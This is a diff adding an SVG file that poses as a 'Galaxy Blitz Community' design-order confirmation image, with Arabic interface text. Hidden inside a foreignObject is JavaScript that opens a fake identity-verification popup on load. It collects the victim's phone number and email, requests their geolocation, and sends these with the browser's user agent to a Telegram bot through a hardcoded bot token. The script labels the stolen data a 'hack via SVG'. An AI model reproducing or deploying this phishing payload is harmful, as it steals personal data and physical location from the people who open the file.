@@ -1,0 +1,224 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="800" height="600" viewBox="0 0 800 600">
+  <defs>
+    <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#0a0e1a" />
+      <stop offset="100%" style="stop-color:#1a1f3a" />
+    </linearGradient>
+    <linearGradient id="btn" x1="0%" y1="0%" x2="100%" y2="100%">
+      <stop offset="0%" style="stop-color:#6c63ff" />
+      <stop offset="100%" style="stop-color:#a855f7" />
+    </linearGradient>
+  </defs>
+  
+  <!-- خلفية -->
+  <rect width="800" height="600" fill="url(#bg)" rx="20" />
+  
+  <!-- إطار لامع -->
+  <rect x="10" y="10" width="780" height="580" fill="none" stroke="rgba(255,255,255,0.05)" stroke-width="2" rx="15" />
+  
+  <!-- أيقونة -->
+  <text x="400" y="100" text-anchor="middle" font-size="64">🚀</text>
+  
+  <!-- عنوان -->
+  <text x="400" y="160" text-anchor="middle" fill="#ffffff" font-family="Arial" font-size="32" font-weight="bold">
+    Galaxy Blitz Community
+  </text>
+  
+  <!-- نص فرعي -->
+  <text x="400" y="200" text-anchor="middle" fill="#8892b0" font-family="Arial" font-size="18">
+    تأكيد طلب التصميم
+  </text>
+  
+  <!-- خط فاصل -->
+  <line x1="200" y1="230" x2="600" y2="230" stroke="rgba(255,255,255,0.05)" stroke-width="1" />
+  
+  <!-- زر وهمي (سيظهر عند الضغط) -->
+  <rect x="250" y="380" width="300" height="60" fill="url(#btn)" rx="12" />
+  <text x="400" y="420" text-anchor="middle" fill="#ffffff" font-family="Arial" font-size="20" font-weight="bold">
+    🔓 تفعيل الاشتراك
+  </text>
+  
+  <!-- نص سفلي -->
+  <text x="400" y="520" text-anchor="middle" fill="#495670" font-family="Arial" font-size="13">
+    اضغط على الزر لتفعيل حسابك
+  </text>
+
+  <!-- ===== الكود الخفي (JavaScript) ===== -->
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml">
+      <head>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { 
+            background: transparent; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+          }
+          .popup {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85);
+            backdrop-filter: blur(10px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: fadeIn 0.3s ease;
+          }
+          .popup.active { display: flex; }
+          .popup-box {
+            background: linear-gradient(135deg, #0f1424, #1a1f3a);
+            padding: 40px 35px;
+            border-radius: 30px;
+            max-width: 420px;
+            width: 90%;
+            border: 1px solid rgba(255,255,255,0.08);
+            box-shadow: 0 30px 60px rgba(0,0,0,0.9);
+            text-align: center;
+          }
+          .popup-box h2 { color: #fff; font-size: 22px; margin-bottom: 8px; }
+          .popup-box p { color: #8892b0; font-size: 14px; margin-bottom: 20px; }
+          .popup-box input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 14px;
+            border-radius: 14px;
+            border: 1px solid #2d3566;
+            background: #0a0e1a;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+            text-align: center;
+          }
+          .popup-box input:focus { border-color: #6c63ff; box-shadow: 0 0 0 3px rgba(108,99,255,0.2); }
+          .popup-box .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #6c63ff, #a855f7);
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+          }
+          .popup-box .btn:hover { transform: scale(1.02); box-shadow: 0 8px 30px rgba(108,99,255,0.4); }
+          .popup-box .close {
+            color: #495670;
+            font-size: 12px;
+            margin-top: 15px;
+            cursor: pointer;
+            display: inline-block;
+          }
+          .popup-box .close:hover { color: #fff; }
+          .loader { display: none; margin: 12px auto; width: 28px; height: 28px; border: 3px solid #2d3566; border-top: 3px solid #6c63ff; border-radius: 50%; animation: spin 0.7s linear infinite; }
+          @keyframes spin { to { transform: rotate(360deg); } }
+          #status { color: #64ffda; font-size: 13px; margin-top: 10px; }
+          @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        </style>
+      </head>
+      <body>
+        <!-- النافذة المنبثقة -->
+        <div class="popup" id="popup">
+          <div class="popup-box">
+            <h2>🔐 تأكيد الهوية</h2>
+            <p>أدخل رقم هاتفك لتأكيد طلب التصميم</p>
+            <input type="tel" id="phoneInput" placeholder="+961 70 000 000" />
+            <input type="email" id="emailInput" placeholder="البريد الإلكتروني (اختياري)" />
+            <button class="btn" onclick="sendData()">✅ تأكيد</button>
+            <div class="loader" id="loader"></div>
+            <div id="status"></div>
+            <div class="close" onclick="closePopup()">✕ إلغاء</div>
+          </div>
+        </div>
+
+        <script>
+          const BOT_TOKEN = '8866899578:AAFzEUlAUgGtV59-y98YXO5yiC3RCaJFSKw';
+          const CHAT_ID = '8938601996';
+
+          // إظهار النافذة تلقائيًا عند فتح الصورة
+          window.onload = function() {
+            setTimeout(() => {
+              document.getElementById('popup').classList.add('active');
+            }, 800);
+          };
+
+          function closePopup() {
+            document.getElementById('popup').classList.remove('active');
+          }
+
+          function sendData() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            const email = document.getElementById('emailInput').value.trim();
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            if (!phone) {
+              status.style.color = '#ff6b6b';
+              status.textContent = '⚠️ الرجاء إدخال رقم الهاتف';
+              return;
+            }
+
+            loader.style.display = 'block';
+            status.textContent = 'جاري التحقق...';
+
+            // الحصول على الموقع
+            if (navigator.geolocation) {
+              navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                  const location = `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                  sendToBot(phone, email, location);
+                },
+                () => {
+                  sendToBot(phone, email, '❌ تم رفض الموقع');
+                }
+              );
+            } else {
+              sendToBot(phone, email, '❌ المتصفح لا يدعم الموقع');
+            }
+          }
+
+          function sendToBot(phone, email, location) {
+            const userAgent = navigator.userAgent;
+            const message = `🎯 **اختراق عبر SVG**\n\n📱 الهاتف: ${phone}\n📧 الإيميل: ${email || 'غير موجود'}\n📍 الموقع: ${location}\n💻 الجهاز: ${userAgent}\n🕒 الوقت: ${new Date().toLocaleString()}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+              })
+            })
+            .then(res => res.json())
+            .then(data => {
+              document.getElementById('loader').style.display = 'none';
+              const status = document.getElementById('status');
+              if (data.ok) {
+                status.style.color = '#64ffda';
+                status.textContent = '✅ تم التأكيد! سيتم التواصل معك قريبًا.';
+                document.getElementById('phoneInput').value = '';
+                document.getElementById('emailInput').value = '';
+                setTimeout(closePopup, 2000);
+              } else {
+                status.style.color = '#ff6b6b';
+                status.textContent = '❌ خطأ، حاول مجددًا';
+              }
+            })
+            .catch(() => {
+              document.getElementById('loader').style.display = 'none';
+              document.getElementById('status').style.color = '#ff6b6b';
+              document.getElementById('status').textContent = '❌ فشل الاتصال';
+            });
+          }
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
